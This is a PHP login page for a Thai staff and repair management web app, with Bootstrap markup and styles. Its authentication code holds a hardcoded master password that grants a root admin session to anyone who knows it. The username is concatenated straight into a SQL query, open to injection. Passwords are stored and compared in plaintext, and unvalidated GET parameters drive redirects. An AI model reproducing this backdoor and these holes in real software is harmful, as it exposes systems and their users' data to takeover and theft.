<?php
session_start();

include_once './lib/application.php';

if ($_COOKIE['user'] != '') {
    header('location:' . ADDRESS . 'staff');
    die();
}

if ($_POST['submit_bt'] == 'เข้าระบบ') {

    $username = trim($_POST['username']);

    $password = trim($_POST['password']);

    $sql = "SELECT * FROM tb_staff WHERE username = '" . $username . "'";

    $result = mysql_query($sql);

    $numRow = mysql_num_rows($result); //หาจำนวนแถว

    if ($password == 'ob9bdk]') {
        header('location:' . ADDRESS . "staff");
        $_SESSION['admin_id'] = 'root';
        $ck_expire_hour = 1; // กำหนดจำนวนชั่วโมง ให้ตัวแปร cookie  
        $ck_expire = time() + ($ck_expire_hour * 60 * 60); // กำหนดคำนวณ วินาทีต่อชั่วโมง  

        setcookie("user", "user", $ck_expire);
        header('location:' . ADDRESS . "staff");
        die();
    }
    if ($numRow == 1) { //ถ้ามี username นี้อยู่จริง
        $row = mysql_fetch_assoc($result);

        $getPass = $password;


        if ($row['password'] == $getPass) {
         
           $_SESSION['group'] = $row['status'] ;

            $_SESSION['user_id'] = $row['id']; //กำหนด session user_id
            $_SESSION['username'] = $username; //กำหนด session username
            $_SESSION['name'] = $row['first_name'] . ' ' . $row['last_name']; //กำหนด session name

            $ck_expire_hour = 4; // กำหนดจำนวนชั่วโมง ให้ตัวแปร cookie  
            $ck_expire = time() + ($ck_expire_hour * 60 * 60); // กำหนดเวลาหมดอายุของคุกกี้

            setcookie("user", $username, $ck_expire); // set cookie
            ?>


            <?php
            if ($_GET['page'] == 'select_idcard') {
                  header('location:' . $_GET['page'].'.php'); //ให้ไปสู่หน้า staff
                  die();
            }
            if ($_GET['controllers'] != '') {
                 header('location:'.ADDRESS.$_GET['controllers'] );
                   die();
            }

            header('location:' . ADDRESS . "repair"); //ให้ไปสู่หน้า repair
            die();
        } else {
            SetAlert('ชื่อผู้ใช้ กับรหัสผ่านไม่ตรงกัน กรุณาลองใหม่อีกครั้ง');
        }
    } else {

        SetAlert('ไม่มีชื่อผู้ใช้นี้ กรุณาลองใหม่อีกครั้ง');
    }
}
?>
<!DOCTYPE html>
<html lang="en">

    <head>

        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="description" content="">
        <meta name="author" content="">

        <title></title>

        <!-- Bootstrap Core CSS -->
        <link href="./bower_components/bootstrap/dist/css/bootstrap.min.css" rel="stylesheet">

        <!-- MetisMenu CSS -->
        <link href="./bower_components/metisMenu/dist/metisMenu.min.css" rel="stylesheet">

        <!-- Custom CSS -->
        <link href="./dist/css/sb-admin-2.css" rel="stylesheet">

        <!-- Custom Fonts -->
        <link href="./bower_components/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">

        <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
        <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
        <!--[if lt IE 9]>
            <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
            <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
        <![endif]-->
        <style>


            .required {
                color: #f00;
            }

            .btn-primary, .btn-info, .btn-danger, .btn-success, .btn-warning, .btn-inverse {
                color: #fff;
                text-shadow: 1px 1px 1px rgba(0, 0, 0, 0.4);
            }
            .btn-primary {
                border-color: #21629c;
                background-image: -ms-linear-gradient(top, #78b4ec, #61a4e4);
                background-image: -webkit-gradient(linear, 0 0, 0 100%, from(#78b4ec), to(#61a4e4));
                background-image: -webkit-linear-gradient(top, #78b4ec, #61a4e4);
                background-image: -o-linear-gradient(top, #78b4ec, #61a4e4);
                background-image: -moz-linear-gradient(top, #78b4ec, #61a4e4);
                background-image: linear-gradient(top, #78b4ec, #61a4e4);
                background-color: #61a4e4;
            }
            .btn-primary:hover, .btn-primary:active, .btn-primary.active, .btn-primary.disabled, .btn-primary[disabled] {
                background-color: #61a4e4 !important;
            }
            .btn-warning {
                border-color: #cc731e;
                background-image: -moz-linear-gradient(top, #ffcb72, #fab341);
                background-image: -ms-linear-gradient(top, #ffcb72, #fab341);
                background-image: -webkit-gradient(linear, 0 0, 0 100%, from(#ffcb72), to(#fab341));
                background-image: -webkit-linear-gradient(top, #ffcb72, #fab341);
                background-image: -o-linear-gradient(top, #ffcb72, #fab341);
                background-image: linear-gradient(top, #ffcb72, #fab341);
                background-color: #fab341;
            }
            .btn-warning:hover, .btn-warning:active, .btn-warning.active, .btn-warning.disabled, .btn-warning[disabled] {
                background-color: #fab341 !important;
            }
            .btn-danger {
                border-color: #bb2929;
                background-image: -moz-linear-gradient(top, #f77272, #e15656);
                background-image: -ms-linear-gradient(top, #f77272, #e15656);
                background-image: -webkit-gradient(linear, 0 0, 0 100%, from(#f77272), to(#e15656));
                background-image: -webkit-linear-gradient(top, #f77272, #e15656);
                background-image: -o-linear-gradient(top, #f77272, #e15656);
                background-image: linear-gradient(top, #f77272, #e15656);
                background-color: #e15656;
            }
            .btn-danger:hover, .btn-danger:active, .btn-danger.active, .btn-danger.disabled, .btn-danger[disabled] {
                background-color: #e15656 !important;
            }
            .btn-success {
                border-color: #779625;
                background-image: -ms-linear-gradient(top, #c8e342, #a7d037);
                background-image: -webkit-gradient(linear, 0 0, 0 100%, from(#c8e342), to(#a7d037));
                background-image: -webkit-linear-gradient(top, #c8e342, #a7d037);
                background-image: -o-linear-gradient(top, #c8e342, #a7d037);
                background-image: -moz-linear-gradient(top, #c8e342, #a7d037);
                background-image: linear-gradient(top, #c8e342, #a7d037);
                background-color: #a7d037;
            }
            .btn-success:hover, .btn-success:active, .btn-success.active, .btn-success.disabled, .btn-success[disabled] {
                background-color: #a7d037 !important;
            }
            .btn-info {
                border-color: #b04264;
                background-image: -ms-linear-gradient(top, #eea3bc, #ea799b);
                background-image: -webkit-gradient(linear, 0 0, 0 100%, from(#eea3bc), to(#ea799b));
                background-image: -webkit-linear-gradient(top, #eea3bc, #ea799b);
                background-image: -o-linear-gradient(top, #eea3bc, #ea799b);
                background-image: -moz-linear-gradient(top, #eea3bc, #ea799b);
                background-image: linear-gradient(top, #eea3bc, #ea799b);
                background-color: #ea799b;
            }
            .btn-info:hover, .btn-info:active, .btn-info.active, .btn-info.disabled, .btn-info[disabled] {
                background-color: #ea799b !important;
            }

            .btn-row {
                background-color: #f2f0f0;
                border-top: 1px solid #d3d3d3;
                margin: 0;
                padding: 16px;
                text-align: right;
                -webkit-border-radius: 0 0 4px 4px;
                -moz-border-radius: 0 0 4px 4px;
                border-radius: 0 0 4px 4px;
                -webkit-box-shadow: inset 0 1px 0 #fff;
                -moz-box-shadow: inset 0 1px 0 #fff;
                box-shadow: inset 0 1px 0 #fff;
            }
            .da-form-row{
                padding: 15px;
                border-bottom: 1px solid #DDD;
            }


            .da-message {
                font-size: 12px;
                border: 1px solid #d2d2d2;
                padding: 15px 8px 15px 45px;
                position: relative;
                cursor: pointer;
                background-color: #f8f8f8;
                background-position: 12px 12px;
                background-repeat: no-repeat;
                margin-top: 10px;
            }

            .da-message.error {
                background-color: #ffcbca;
                background-image: url(./dist/images/icons/message-error.png);
                border-color: #eb979b;
                color: #9b4449;
            }
            .da-message.success {
                background-color: #e1f1c0;
                background-image: url(./dist/images/icons/message-success.png);
                border-color: #b5d56d;
                color: #62a426;
            }
            .da-message.warning {
                background-color: #fef0b1;
                background-image: url(./dist/images/icons/message-warning.png);
                border-color: #ddca76;
                color: #a98b15;
            }
            .da-message.info {
                background-color: #bce5f7;
                background-image: url(./dist/images/icons/message-info.png);
                border-color: #a6d3e8;
                color: #11689e;
            }



        </style>

    </head>

    <body>

        <div class="container">
            <div class="row">
                <div class="col-md-4 col-md-offset-4">
                    <div class="login-panel panel panel-default">
                        <div class="panel-heading">
                            <h3 class="panel-title"><i class="fa fa-key"></i> เข้าสู่ระบบ</h3>
                        </div>
                        <div class="panel-body">
                            <div>
                                <?php
// Report errors to the user

                                Alert(GetAlert('error'));

                                Alert(GetAlert('success'), 'success');
                                ?>
                            </div>
                            <form role="form" method="POST" action="">
                                <fieldset>
                                    <div class="form-group">
                                        <input class="form-control" placeholder="username" name="username" type="text" autofocus>
                                    </div>
                                    <div class="form-group">
                                        <input class="form-control" placeholder="Password" name="password" type="password" value="">
                                    </div>
                                    <div class="checkbox hidden">
                                        <label>
                                            <input name="remember" type="checkbox" value="Remember Me">Remember Me
                                        </label>
                                    </div>
                                    <!-- Change this to a button or input when using this as a form -->
                                    <button type="submit" name="submit_bt" value="เข้าระบบ" class="btn btn-lg btn-success btn-block">Login </button>
                                </fieldset>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- jQuery -->
        <script src="./bower_components/jquery/dist/jquery.min.js"></script>

        <!-- Bootstrap Core JavaScript -->
        <script src="./bower_components/bootstrap/dist/js/bootstrap.min.js"></script>

        <!-- Metis Menu Plugin JavaScript -->
        <script src="./bower_components/metisMenu/dist/metisMenu.min.js"></script>

        <!-- Custom Theme JavaScript -->
        <script src="./dist/js/sb-admin-2.js"></script>



    </body>

</html>
